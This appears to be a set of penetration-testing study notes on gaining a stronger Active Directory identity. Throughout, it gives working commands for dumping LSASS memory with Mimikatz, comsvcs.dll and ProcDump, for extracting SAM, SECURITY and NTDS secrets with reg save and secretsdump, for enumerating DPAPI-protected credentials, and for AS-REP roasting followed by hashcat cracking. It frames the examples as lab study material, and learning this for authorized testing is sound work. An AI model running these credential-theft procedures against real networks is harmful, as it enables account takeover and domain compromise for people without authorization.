text: id="gain-a-more-useful-domain-identity">6.3.11 Gain a more useful domain identity Strategy map | Master Notes | Operational index | Cheatsheets Choose a credential source or object transition by its prerequisites. Track the exact account, credential type and compatible service after every transition. Conditional AD CS/delegation/GPO branches require their own complete enabling chain. Speedrun blocks: 11; credential classification in 5. Documented methods: 18. Examples are hypothetical study material. Apply commands only to an assigned scope during the later practice phase. A method is enabled by its prerequisites; its presence here does not establish a vulnerability or practical mastery. <h2

title: 6.3.11.1 First pass: tools and findings
text: id="first-pass-tools-and-findings">6.3.11.1 First pass: tools and findings Use the branch matching the current host, identity and observed result. Tool output supplies leads; the linked procedure verifies and uses the exact condition. <h3

title: 6.3.11.1.1 Inspect the tickets/material already available
text: id="inspect-the-ticketsmaterial-already-available">6.3.11.1.1 Inspect the tickets/material already available Use the current identity and ticket cache before attempting credential collection or ticket construction. klist If A valid service-scoped ticket: Check service principal, expiry and the matching client. → Classify tickets and use a compatible cache . If A privileged local token and an accessible credential source: Check protection and exact source prerequisites before selecting a collector. → Obtain accessible live logon-session credential material . Otherwise: No useful ticket/source: inspect account configuration and object rights with the available domain identity. → Enumerate directory objects with native, LDAP and PowerView approaches . <h3

title: 6.3.11.1.2 Choose AS-REP or SPN roasting from account evidence
text: id="choose-as-rep-or-spn-roasting-from-account-evidence">6.3.11.1.2 Choose AS-REP or SPN roasting from account evidence Use this branch only for a confirmed preauthentication-disabled account; ordinary SPN accounts use a different request. impacket-GetNPUsers 'DOMAIN/USER' -no-pass -dc-ip DC_IP If A valid AS-REP response for the known account: Use the type-specific offline recovery path. → Request AS-REP material for an account without preauthentication . If A normal service account with an SPN: Request the matching service ticket in an authenticated context. → Request a selected service ticket for offline service-account recovery . Otherwise: The account requires preauthentication: stop this path and inspect SPNs or effective object rights. → Validate effective directory-object control . <h3

title: 6.3.11.1.3 Resolve an ACL edge to its concrete operation
text: id="resolve-an-acl-edge-to-its-concrete-operation">6.3.11.1.3 Resolve an ACL edge to its concrete operation Use the exact trustee, target class, GUID and inheritance/deny behavior, not the graph label alone. Get-DomainObjectAcl -Identity TARGET_OBJECT -ResolveGUIDs If Effective password-reset right on the intended user: Confirm account state and the effect of changing its password. → Reset a target account password through a validated directory right . If Effective write to a useful group's member attribute: Confirm the group effect and refresh the resulting token/logon context. → Add a controlled identity to a group through effective membership rights . If WriteOwner/WriteDacl on the target object: Preserve original state and validate each intermediate right. → Convert ownership or DACL control into a narrower useful right . Otherwise: The right is not effective for the controlled principal: discard that edge and inspect another verified relationship. → Enumerate directory objects with native, LDAP and PowerView approaches . <h2

title: 6.3.11.2 Discovery workflow
text: id="discovery-workflow">6.3.11.2 Discovery workflow Start from a mapped object/right, an available ticket, or a host whose current privilege may expose a credential source. Follow these observations into a method; the detailed recognition routes below show synthetic output and the checks still needed. Inspect existing tickets and host privilege/protection before invasive collection: Inventory, convert and import tickets in the correct logon context ; Obtain accessible live logon-session credential material . Choose matched local credential sources and classify what each produces: Extract local account hashes from matched SAM and SYSTEM ; Extract LSA secrets and cached-domain verifiers ; Use Credential Manager and DPAPI with the protecting context ; Parse an offline domain database or select a justified remote collection path . Discover the actual account flag or SPN before choosing a roast path: Request AS-REP material for an account without preauthentication ; Request a selected service ticket for offline service-account recovery ; Create a temporary SPN through an effective object right . Resolve the exact ACE and object before password, group, DACL or replication transitions: Reset a target account password through a validated directory right ; Add a controlled identity to a group through effective membership rights ; Convert ownership or DACL control into a narrower useful right ; Use validated directory replication rights for bounded credential proof . Expand certificate, delegation or GPO paths only when their specific configuration evidence exists: Conditional: validate an AD CS enrollment-to-authentication path ; Conditional: use a validated delegation or RBCD relationship ; Conditional: trace GPO control to privileged policy consumption . PowerView examples require a reviewed compatible script in the current authenticated directory context. Check the loaded copy rather than mixing legacy/fork parameter names; the directory-mapping entry includes native, ADSI and LDAP alternatives. Import-Module .\PowerView.ps1 Get-Command -Module PowerView Decision rule: an observed clue opens a candidate. Choose it only after the missing conditions are verified; a failed check rules out that context, while unavailable evidence stays inconclusive . <h2

title: 6.3.11.3 Method families
text: id="method-families">6.3.11.3 Method families Host credential sources: Obtain accessible live logon-session credential material , Extract local account hashes from matched SAM and SYSTEM , Extract LSA secrets and cached-domain verifiers , Use Credential Manager and DPAPI with the protecting context , Parse an offline domain database or select a justified remote collection path . Password-derived ticket recovery: Request AS-REP material for an account without preauthentication , Request a selected service ticket for offline service-account recovery , Create a temporary SPN through an effective object right . Ticket capabilities: Inventory, convert and import tickets in the correct logon context , Forge a service-scoped ticket from the correct service key . Object-backed identity changes and replication: Reset a target account password through a validated directory right , Add a controlled identity to a group through effective membership rights , Convert ownership or DACL control into a narrower useful right , Use validated directory replication rights for bounded credential proof . Conditional policy, delegation and certificate paths: Conditional: trace GPO control to privileged policy consumption , Conditional: use a validated delegation or RBCD relationship , Conditional: validate an AD CS enrollment-to-authentication path , Conditional: understand a realm-wide TGT forgery from KRBTGT material . <h2

Discovery action — reference example: Execution context, effects and stopping rule Host/access: A domain identity, appropriate host privilege, or a validated effective directory-object right Requires: Required process/host privileges, useful sessions and compatible architecture; PPL/Credential Guard/protection may prevent access or remove material Action class: May request tickets, collect sensitive material or change directory state; use the exact selected procedure. Stop/verify: Tie each artifact to an account, source/logon session and material type; independently validate any useful reuse. Failure/next check: Protected process access denial, absent sessions and unsupported parsing are different outcomes. Prefer an accessible ticket or other matched source when available. whoami /all query user reg query HKLM\SYSTEM\CurrentControlSet\Control\Lsa /v RunAsPPL Illustrative evidence — synthetic, abbreviated: The excerpt may combine command fields with labelled observations from the preceding investigation; it is not a real-target transcript or a promise of exact tool formatting. Current context: privileged host token Session list: DOMAIN\USER may be present RunAsPPL: enabled Recognize this detail: A useful session is a possible source, while PPL/protection can prevent the chosen process-memory access. Still missing before method selection: Verify actual privilege, fresh useful sessions, process/architecture compatibility and protection; prefer accessible tickets when sufficient. Outcome after checking Example and next decision Enabled after validation The authorized source is accessible and yields correctly classified material: follow its actual credential type. Ruled out in this context The required source is protected/unavailable to this context: reject that collection method. Inconclusive A past graph session without fresh host evidence leaves useful live material unknown. If you do not yet have this clue: start with Establish Windows token, host and process context . <h3

text: id="5-why-it-works">6.3.11.5.5 Why it works LSASS material depends on logon type, authentication package, session lifetime and protection. Administrator membership alone does not guarantee readable credentials or plaintext passwords. <h3

title: 6.3.11.5.6 Execute and choose variants
text: id="6-execute-and-choose-variants">6.3.11.5.6 Execute and choose variants Source What it can contain Typical prerequisite Result is not automatically Current ticket cache TGTs and service tickets for the current logon session Current user; other LUIDs normally require elevation A password, NT hash or authorization to every service LSASS memory/dump Logon-session NTLM/AES/DPAPI material and tickets, depending on OS/protection/logon type Administrator/SYSTEM, suitable debug/dump access, compatible architecture Guaranteed cleartext or every user's reusable secret SAM + SYSTEM Local account password hashes Administrator/SYSTEM/backup-capable access to matched hives Domain-account material SECURITY + SYSTEM LSA secrets, service/machine secrets, cached domain verifiers Administrator/SYSTEM/backup-capable access to matched hives Directly passable cached-domain hashes Credential Manager/DPAPI Targeted saved credentials and protected application data Suitable user/machine context plus master-key material Plaintext merely because a blob/file is readable NTDS + SYSTEM Domain account hashes/keys from a DC database DC-level file access and matched boot-key material Ordinary member-server admin access DRS replication Selected domain-account secrets Effective replication rights at the domain root Local admin, DC service access or Domain Users membership whoami /all tasklist /fi "imagename eq lsass.exe" reg query HKLM\SYSTEM\CurrentControlSet\Control\Lsa /v RunAsPPL reg query HKLM\SYSTEM\CurrentControlSet\Control\Lsa /v LsaCfgFlags reg query HKLM\SOFTWARE\Policies\Microsoft\Windows\DeviceGuard /v LsaCfgFlags Get-CimInstance -ClassName Win32_DeviceGuard -Namespace root\Microsoft\Windows\DeviceGuard | Select-Object SecurityServicesConfigured,SecurityServicesRunning,VirtualizationBasedSecurityStatus Interpretation: membership in Administrators with a medium-integrity filtered token is not equivalent to an elevated process; SeDebugPrivilege must be present and usable for common live-process access; a missing registry value is not definitive proof that a protection is disabled because defaults, policy and firmware state matter; LSA protection blocks untrusted code injection/process-memory access; Credential Guard isolates selected NTLM, Kerberos and saved-domain secrets with VBS; EDR/AV can block a tool or dump path without proving the underlying credential source is empty. An access-denied or empty result disproves only that method in the current context. <h5

title: 6.3.11.5.6.1.1 Direct Mimikatz access
text: id="direct-mimikatz-access">6.3.11.5.6.1.1 Direct Mimikatz access mimikatz.exe privilege::debug sekurlsa::logonpasswords sekurlsa::tickets Decisive output is a named logon session with a typed value: NTLM, AES key, DPAPI key or ticket. A username with Password : (null) is not a failed tool run when another useful field exists, and modern Windows commonly does not retain reusable cleartext. <h5

title: 6.3.11.5.6.1.2 Dump first, parse offline
text: id="dump-first-parse-offline">6.3.11.5.6.1.2 Dump first, parse offline Built-in comsvcs.dll method from an elevated command prompt: for /f "tokens=2" %A in ('tasklist ^| findstr /i lsass.exe') do rundll32.exe C:\Windows\System32\comsvcs.dll, MiniDump %A C:\Windows\Temp\lsass.dmp full Sysinternals ProcDump alternative: procdump64.exe -accepteula -ma lsass.exe C:\Windows\Temp\lsass.dmp Parse with a compatible Mimikatz build: mimikatz.exe sekurlsa::minidump C:\Path\To\lsass.dmp sekurlsa::logonpasswords sekurlsa::tickets Common failures: dump creation denied: token/protection/EDR or process-access prerequisite failed; ProcessorArchitecture mismatch: use compatible x64/x86 tooling; OS major-version mismatch: parse with a compatible build/environment; dump succeeds but secrets are absent: logon type, sign-out/reboot, Credential Guard and provider behavior affect contents. LSASS dumps are sensitive and noisy. Hash the evidence if needed, transfer through the established route, store it privately and remove the target copy after the authorized objective. Get-ComputerInfo | Select-Object DeviceGuardSecurityServicesConfigured,DeviceGuardSecurityServicesRunning Credential Guard can isolate reusable domain secrets from ordinary LSASS memory. It does not erase local SAM, file, vault, DPAPI, ticket, service-configuration or directory-right paths. One failed dump method disproves only that method and context. Intrusive SSP interception changes system state and waits for a future logon; it is not the default Block 5 response. <h3

text: id="find-the-clue-from-your-starting-access-1">6.3.11.6.2.1 Find the clue from your starting access Where to investigate: At a host context with justified protected-file access inspect current privileges and the source machine before selecting matched registry material. Discovery action — reference example: Execution context, effects and stopping rule Host/access: A domain identity, appropriate host privilege, or a validated effective directory-object right Requires: Matched SAM/SYSTEM from the same system and appropriate read/backup access Action class: May request tickets, collect sensitive material or change directory state; use the exact selected procedure. Stop/verify: Verify source machine, matched hive pair and account/RID mapping; validate destination rights separately. Failure/next check: Mismatched/incomplete hives or denied backup operations require source repair. Local hashes do not automatically grant domain access. hostname whoami /priv Illustrative evidence — synthetic, abbreviated: The excerpt may combine command fields with labelled observations from the preceding investigation; it is not a real-target transcript or a promise of exact tool formatting. Host: TARGET_HOST Relevant backup/read privilege: present Needed pair: SAM plus matching SYSTEM Recognize this detail: Sufficient source access suggests local-account extraction, not domain-account extraction. Still missing before method selection: Verify a supported backup/read operation, complete same-host hives and offline parser context. Outcome after checking Example and next decision Enabled after validation The matched local pair is available and parses correctly: classify the returned local hashes. Ruled out in this context Only unrelated/mismatched hives are available: reject parsing them as a consistent pair. Inconclusive A privilege name alone does not establish the artifacts can be obtained. text: id="5-why-it-works-1">6.3.11.6.5 Why it works SAM stores local account verifiers protected using key material derived from SYSTEM. These are local identities; a same-named domain account is a different principal. <h3

title: 6.3.11.6.6 Execute and choose variants
text: id="6-execute-and-choose-variants-1">6.3.11.6.6 Execute and choose variants reg save HKLM\SAM C:\Windows\Temp\SAM.hive /y reg save HKLM\SYSTEM C:\Windows\Temp\SYSTEM.hive /y impacket-secretsdump -sam SAM.hive -system SYSTEM.hive LOCAL Mimikatz alternative from a suitable elevated context: privilege::debug token::elevate lsadump::sam Interpret a typical account row as: LOCAL_USER:RID:LM_HASH:NT_HASH::: The NT hash is local-account material. Its reuse depends on the same local password existing elsewhere, account state, remote UAC restrictions, service support and host authorization. Return it to the credential-classification workflow; do not call it a domain credential. <h3

title: 6.3.11.7.2.1 Find the clue from your starting access
text: id="find-the-clue-from-your-starting-access-2">6.3.11.7.2.1 Find the clue from your starting access Where to investigate: Inspect the rights and origin of a protected registry backup and distinguish SECURITY data from SAM before collection/parsing. Discovery action — reference example: Execution context, effects and stopping rule Host/access: A domain identity, appropriate host privilege, or a validated effective directory-object right Requires: Appropriate host/read privilege and complete matching key/source files Action class: May request tickets, collect sensitive material or change directory state; use the exact selected procedure. Stop/verify: Retain source, account, type and required factors; do not label every parsed output a Pass-the-Hash credential. Failure/next check: Absent cached entries or protected secrets are source-specific limitations; use another justified credential source. hostname whoami /priv Illustrative evidence — synthetic, abbreviated: The excerpt may combine command fields with labelled observations from the preceding investigation; it is not a real-target transcript or a promise of exact tool formatting. Available snapshot: SECURITY.save Matching SYSTEM.save: verify Expected outputs: LSA secrets and cached logon records Recognize this detail: A SECURITY source targets secrets/cached verifiers with distinct semantics; it is not simply another SAM. Still missing before method selection: Confirm matched key material and classify every returned service/machine secret or DCC2 record. Outcome after checking Example and next decision Enabled after validation A complete matched source yields usable typed material: choose its type-specific next method. Ruled out in this context The SYSTEM file comes from another snapshot/machine: reject that consistency assumption. Inconclusive An empty parser result with incomplete source/context leaves credential absence unproved. If you do not yet have this clue: start with Use backup privilege to obtain protected local credential material . <h3

title: 6.3.11.7.5 Why it works
text: id="5-why-it-works-2">6.3.11.7.5 Why it works Different SECURITY records encode different capabilities. DCC2 is an offline verifier; a machine-account secret and a service password have different identities and compatible uses. <h3

title: 6.3.11.7.6 Execute and choose variants
text: id="6-execute-and-choose-variants-2">6.3.11.7.6 Execute and choose variants reg save HKLM\SECURITY C:\Windows\Temp\SECURITY.hive /y reg save HKLM\SYSTEM C:\Windows\Temp\SYSTEM.hive /y impacket-secretsdump -security SECURITY.hive -system SYSTEM.hive LOCAL Mimikatz alternative: privilege::debug token::elevate lsadump::secrets lsadump::cache Potential categories: $MACHINE.ACC : member computer's domain-account secret/key material; service/autologon secrets: usefulness depends on whether the service/account remains active; NL$1 -style cached logon data: DCC2/MSCache v2 verifier material. DCC2 is for offline guessing, not Pass-the-Hash: hashcat -m 2100 dcc2.hashes wordlist.txt -r /usr/share/hashcat/rules/best64.rule Verify the exact format with the installed Hashcat examples before cracking. <h3

Test: classify each output independently. Illustrative output: DCC2 needs recovery while the service password can be validated directly. Interpretation: choose separate next methods. <h3

text: id="8-verify-the-result-2">6.3.11.7.8 Verify the result Retain source, account, type and required factors; do not label every parsed output a Pass-the-Hash credential. <h3

title: 6.3.11.7.9 Failure and fallback
text: id="9-failure-and-fallback-2">6.3.11.7.9 Failure and fallback Absent cached entries or protected secrets are source-specific limitations; use another justified credential source. <h3

title: 6.3.11.8.2.1 Find the clue from your starting access
text: id="find-the-clue-from-your-starting-access-3">6.3.11.8.2.1 Find the clue from your starting access Where to investigate: Inspect saved-credential targets and readable protected files within the current protecting user/machine context. Discovery action — reference example: Execution context, effects and stopping rule Host/access: A domain identity, appropriate host privilege, or a validated effective directory-object right Requires: Access to the protected data plus matching user/machine context, master-key material or an appropriate recovery factor Action class: May request tickets, collect sensitive material or change directory state; use the exact selected procedure. Stop/verify: Verify the decrypted value or actual saved-credential action in its matching context. Failure/next check: Missing master keys, wrong protecting identity or incomplete artifacts require another source/context. whoami /user cmdkey /list Illustrative evidence — synthetic, abbreviated: The excerpt may combine command fields with labelled observations from the preceding investigation; it is not a real-target transcript or a promise of exact tool formatting. Protecting user: USER_SID Credential target: TARGET_HOST Available artifact: protected blob; plaintext not shown Recognize this detail: The target and protecting SID identify which keys/context or consumer must be investigated. Still missing before method selection: Check matching master keys/recovery factors or an allowed saved-credential consumer; file read alone is insufficient. Outcome after checking Example and next decision Enabled after validation Matching protection factors decrypt the material or the intended consumer works: use that bounded capability. Ruled out in this context Only a blob from an unrelated user is present without its required factors: reject the current decryption route. Inconclusive A cmdkey listing without usable context does not establish a password. If you do not yet have this clue: start with Recover Windows application, history and stored-credential artifacts . <h3

text: id="3-prerequisites-3">6.3.11.8.3 Prerequisites Starting access: A domain identity, appropriate host privilege, or a validated effective directory-object right. title: 6.3.11.8.4 Discover and verify prerequisites
text: id="4-discover-and-verify-prerequisites-3">6.3.11.8.4 Discover and verify prerequisites cmdkey /list whoami /all <h3

title: 6.3.11.8.5 Why it works
text: id="5-why-it-works-3">6.3.11.8.5 Why it works DPAPI ties protection to user/machine keys and context. A blob or cmdkey listing alone does not disclose plaintext, and a stored credential may be target/logon-type bound. <h3

title: 6.3.11.8.6 Execute and choose variants
text: id="6-execute-and-choose-variants-3">6.3.11.8.6 Execute and choose variants cmdkey /list vaultcmd /list vaultcmd /listcreds:"Windows Credentials" /all Get-ChildItem "$env:APPDATA\Microsoft\Credentials" -Force -ErrorAction SilentlyContinue Get-ChildItem "$env:LOCALAPPDATA\Microsoft\Credentials" -Force -ErrorAction SilentlyContinue Get-ChildItem "$env:APPDATA\Microsoft\Protect" -Force -Recurse -ErrorAction SilentlyContinue For each entry record target, type, username, persistence/context and whether a compatible application can ask Windows to use it. A listed credential is not necessarily exportable plaintext. DPAPI reasoning: PROTECTED BLOB -> MASTER-KEY GUID -> USER OR MACHINE PROTECT SCOPE -> MASTER-KEY DECRYPTION MATERIAL -> APPLICATION-SPECIFIC DECODING Possible decryption material includes the already logged-on user context, the user's password/NT hash, machine context or a domain DPAPI backup key. Prefer using the authorized existing context rather than copying unrelated protected data. One blob without its master key/context is incomplete. <h3

Interpretation: record the capability rather than inventing a plaintext secret. <h3

title: 6.3.11.9.2.1 Find the clue from your starting access
text: id="find-the-clue-from-your-starting-access-4">6.3.11.9.2.1 Find the clue from your starting access Where to investigate: Start only from evidence of an already controlled DC or a domain replication right; identify the source mechanism before choosing a generic extraction command. Discovery action — reference example: Execution context, effects and stopping rule Host/access: A domain identity, appropriate host privilege, or a validated effective directory-object right Requires: Matched NTDS/SYSTEM for offline parsing, or the specific remote protocol/host/replication rights required by the chosen method Action class: May request tickets, collect sensitive material or change directory state; use the exact selected procedure. Stop/verify: Verify source consistency, account mapping and the exact collection method; retain sensitive output privately. Failure/next check: DC reachability or local administrator access on a member server is not sufficient for domain replication. file NTDS.dit SYSTEM.save Illustrative evidence — synthetic, abbreviated: The excerpt may combine command fields with labelled observations from the preceding investigation; it is not a real-target transcript or a promise of exact tool formatting. NTDS.dit: database artifact SYSTEM.save: registry artifact Same DC/consistent snapshot: must be verified Recognize this detail: A database/key pair is an offline source candidate; remote DRS requires a different permission chain. Still missing before method selection: Verify same-source consistency and access, or independently validate the exact replication/remote collection prerequisites. Outcome after checking Example and next decision Enabled after validation The consistent offline pair parses into account-labelled material: choose classification/reuse. Ruled out in this context Only administrator access on a member server exists: reject the assumed domain-database/replication access. Inconclusive Two filenames without provenance do not prove a matched usable source. If you do not yet have this clue: start with Use backup privilege to obtain protected local credential material . <h3

title: 6.3.11.9.5 Why it works
text: id="5-why-it-works-4">6.3.11.9.5 Why it works Offline database parsing and DRS replication are different mechanisms. A generic remote extraction command can try multiple methods; select only the source whose prerequisites have been taught and verified. <h3

title: 6.3.11.9.6 Execute and choose variants
text: id="6-execute-and-choose-variants-4">6.3.11.9.6 Execute and choose variants <h5

title: 6.3.11.9.6.1.1 Offline NTDS from an already controlled DC
text: id="offline-ntds-from-an-already-controlled-dc">6.3.11.9.6.1.1 Offline NTDS from an already controlled DC An offline parse needs a matched NTDS.dit and SYSTEM hive: impacket-secretsdump -ntds NTDS.dit -system SYSTEM.hive LOCAL Obtaining locked DC database files normally requires DC-level privilege and a snapshot/backup-aware method. Ordinary local administrator on a member server does not provide this material. <h5

title: 6.3.11.9.6.1.2 Remote collection
text: id="remote-collection">6.3.11.9.6.1.2 Remote collection impacket-secretsdump -dc-ip DC_IP 'DOMAIN/USER:PASSWORD@DC_HOST' impacket-secretsdump -hashes :NT_HASH -dc-ip DC_IP 'DOMAIN/USER@DC_HOST' This broad form can invoke several remote collection paths and is high impact. Use it only when the lab objective and privileges justify those sources. For replication rights and a bounded one-user request, use DCSync . <h3

title: 6.3.11.10.2 Recognition clues
text: id="2-recognition-clues-5">6.3.11.10.2 Recognition clues A known user or directory flag indicates Kerberos preauthentication is disabled. <h4

title: 6.3.11.10.2.1 Find the clue from your starting access
text: id="find-the-clue-from-your-starting-access-5">6.3.11.10.2.1 Find the clue from your starting access Where to investigate: With an authenticated directory view inspect userAccountControl; without a bind, use only the documented known-user/no-password KDC path and distinguish its replies. Discovery action — reference example: Execution context, effects and stopping rule Host/access: A known domain username for a password-free request, or an authenticated bind for directory-backed discovery Requires: Account with preauthentication disabled, KDC reachability and a supported returned encryption type; no-password and authenticated-discovery contexts differ Action class: May request tickets, collect sensitive material or change directory state; use the exact selected procedure. Stop/verify: Verify the account, realm, response format/encryption type and recovered credential if cracking succeeds. Failure/next check: Preauthentication-required disproves this method for that account; unknown user, route and clock failures have different meanings. Get-DomainUser -Properties samaccountname,useraccountcontrol | Select-Object samaccountname,@{n='UAC';e={[int]$_.useraccountcontrol}} | Where-Object { ($_.UAC -band 0x400000) -ne 0 } Illustrative evidence — synthetic, abbreviated: The excerpt may combine command fields with labelled observations from the preceding investigation; it is not a real-target transcript or a promise of exact tool formatting. samaccountname UAC TARGET_USER 4194816 Bit 0x400000: set Recognize this detail: The DONT_REQUIRE_PREAUTH bit is set. Test the bit, not equality to one whole decimal value, because other flags coexist. Still missing before method selection: Check account state, KDC route, response/encryption type and feasible recovery; no-password discovery requires a real known username. Outcome after checking Example and next decision Enabled after validation The selected enabled account returns the supported AS-REP artifact: choose its offline recovery path. Ruled out in this context The KDC requires preauthentication for that account: reject AS-REP roasting for that identity. Inconclusive An unknown user or KDC timeout says nothing about the preauthentication setting. If you do not yet have this clue: start with Enumerate directory objects with native, LDAP and PowerView approaches . <h3

title: 6.3.11.10.3 Prerequisites
text: id="3-prerequisites-5">6.3.11.10.3 Prerequisites Starting access: A known domain username for a password-free request, or an authenticated bind for directory-backed discovery. Required conditions: Account with preauthentication disabled, KDC reachability and a supported returned encryption type; no-password and authenticated-discovery contexts differ. <h3

title: 6.3.11.10.4 Discover and verify prerequisites
text: id="4-discover-and-verify-prerequisites-5">6.3.11.10.4 Discover and verify prerequisites impacket-GetNPUsers 'DOMAIN/USER' -no-pass -dc-ip DC_IP <h3

title: 6.3.11.10.5 Why it works
text: id="5-why-it-works-5">6.3.11.10.5 Why it works Without preauthentication, the KDC can return an encrypted AS response whose relevant part permits offline guessing of the account's password-derived key. Receiving it does not reveal the password. <h3

title: 6.3.11.10.6 Execute and choose variants
text: id="6-execute-and-choose-variants-5">6.3.11.10.6 Execute and choose variants <h5

title: 6.3.11.10.6.1.1 Why AS-REP roasting works
text: id="why-as-rep-roasting-works">6.3.11.10.6.1.1 Why AS-REP roasting works Ordinary Kerberos preauthentication makes the user prove knowledge of the long-term key before the KDC returns AS-REP material. If the account has DONT_REQUIRE_PREAUTH , an unauthenticated requester can ask for an AS-REP whose encrypted component can be tested offline against password candidates. KNOWN USERNAME + PREAUTH DISABLED + KDC REACHABLE -> AS-REP CIPHER -> OFFLINE GUESSING -> PASSWORD ONLY IF A CANDIDATE VERIFIES <h5

title: 6.3.11.10.6.1.2 One known user, no password
text: id="one-known-user-no-password">6.3.11.10.6.1.2 One known user, no password impacket-GetNPUsers 'DOMAIN/TARGET_USER' -no-pass -request \ -dc-ip DC_IP -outputfile asrep-TARGET_USER.hashes <h5

title: 6.3.11.10.6.1.3 Supplied user list, no password
text: id="supplied-user-list-no-password">6.3.11.10.6.1.3 Supplied user list, no password impacket-GetNPUsers 'DOMAIN/' -no-pass -request -usersfile users.txt \ -dc-ip DC_IP -outputfile asrep.hashes <h5

title: 6.3.11.10.6.1.4 Authenticated directory-backed discovery
text: id="authenticated-directory-backed-discovery">6.3.11.10.6.1.4 Authenticated directory-backed discovery impacket-GetNPUsers 'DOMAIN/USER' -request \ -dc-ip DC_IP -outputfile asrep.hashes Omitting the password from the target lets the tool prompt rather than storing it in shell history. <h5

title: 6.3.11.10.6.1.5 Windows/Rubeus alternative
text: id="windowsrubeus-alternative">6.3.11.10.6.1.5 Windows/Rubeus alternative Rubeus.exe asreproast /user:TARGET_USER /domain:DOMAIN /dc:DC_HOST /outfile:asrep.hashes /format:hashcat <h5

title: 6.3.11.10.6.1.6 Interpret before cracking
text: id="interpret-before-cracking">6.3.11.10.6.1.6 Interpret before cracking Output Meaning Next action $krb5asrep$23$ RC4 AS-REP offline verifier Hashcat mode 18200 AS-REP with another etype Different cipher/format Match the exact prefix to installed Hashcat/John support KDC_ERR_C_PRINCIPAL_UNKNOWN User/realm not found Recheck spelling, realm and DC Preauthentication required / no UF_DONT_REQUIRE_PREAUTH Account is not roastable through this method Disprove this path for that account Timeout/name error KDC route/DNS problem Fix route/FQDN/time before account conclusions hashcat -m 18200 asrep.hashes wordlist.txt -r /usr/share/hashcat/rules/best64.rule hashcat -m 18200 asrep.hashes --show Do not call the account compromised because a hash was captured. Only a verified offline candidate produces a password, and that password still needs identity/access mapping. <h3

title: 6.3.11.10.7 Worked example — hypothetical
text: id="7-worked-example--hypothetical-5">6.3.11.10.7 Worked example — hypothetical Observation: an account is marked without preauthentication. Test: request only its AS-REP material. Illustrative output: a supported hash-format response returns. Interpretation: use the format's correct offline mode and validate any recovered password. <h3

text: id="8-verify-the-result-5">6.3.11.10.8 Verify the result Verify the account, realm, response format/encryption type and recovered credential if cracking succeeds. <h3
